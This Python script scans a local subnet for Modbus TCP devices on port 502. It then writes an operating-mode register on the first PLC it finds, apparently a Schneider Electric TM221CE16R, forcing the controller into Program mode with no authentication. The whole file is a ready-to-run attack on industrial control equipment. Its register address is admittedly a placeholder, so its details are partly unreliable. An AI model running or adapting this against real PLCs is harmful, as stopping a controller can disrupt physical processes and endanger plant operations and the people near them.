import socket
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Function to scan the local subnet for Modbus TCP-enabled devices
def find_plc_ip(subnet_base, port=502):
    """
    Scan the subnet to find Modbus TCP-enabled devices.

    :param subnet_base: String - The base subnet to scan (e.g., '192.168.9.')
    :param port: Integer - The Modbus TCP port (default: 502)
    :return: String - IP address of the PLC if detected
    """
    print("[*] Scanning subnet {} for Modbus TCP devices...".format(subnet_base))
    for i in range(1, 255):  # Scan IP addresses .1 to .254
        ip = f"{subnet_base}{i}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # Timeout after 500ms
            s.connect((ip, port))
            s.close()
            print(f"[+] Found Modbus TCP device at {ip}")
            return ip  # Return the first found Modbus TCP device
        except (socket.timeout, ConnectionRefusedError):
            pass
    print("[-] No Modbus TCP devices found.")
    return None

# Function to change the PLC's operating mode
def change_plc_mode(ip_address, mode):
    """
    Change the operating mode of the PLC via Modbus TCP.

    :param ip_address: String - IP address of the PLC
    :param mode: Integer - Desired operating mode (e.g., 1 = "Program"; Refer to the vendor documentation)
    :return: None
    """
    try:
        print(f"[*] Connecting to PLC at {ip_address}...")
        client = ModbusTcpClient(ip_address)
        if not client.connect():
            print("[-] Unable to connect to the PLC.")
            return

        # Schneider Electric TM221CE16R specific Modbus register for Operating Mode
        # Note: Obtain the correct register address from the vendor's documentation.
        OPERATING_MODE_REGISTER = 0x1010  # Example register (replace with actual)
        
        # Attempt to change the operating mode
        print(f"[*] Changing PLC mode to {mode} (Program mode = 1)...")
        result = client.write_register(OPERATING_MODE_REGISTER, mode)
        
        if result.isError():
            print("[-] Failed to change the operating mode.")
        else:
            print("[+] Successfully changed the operating mode.")
        
        client.close()

    except ModbusException as e:
        print(f"[!] Modbus error: {e}")
    except Exception as e:
        print(f"[!] General error: {e}")

# Main script execution
if __name__ == "__main__":
    # Step 1: Scan the network for the PLC
    subnet_base = "192.168.9."  # Modify this to your subnet
    plc_ip = find_plc_ip(subnet_base)

    if plc_ip:
        # Step 2: Change the PLC's mode to Program (assume 1 = Program mode)
        PROGRAM_MODE = 1  # Schneider Electric documentation will specify the correct value
        change_plc_mode(plc_ip, PROGRAM_MODE)
    else:
        print("[-] No PLC found on the subnet.")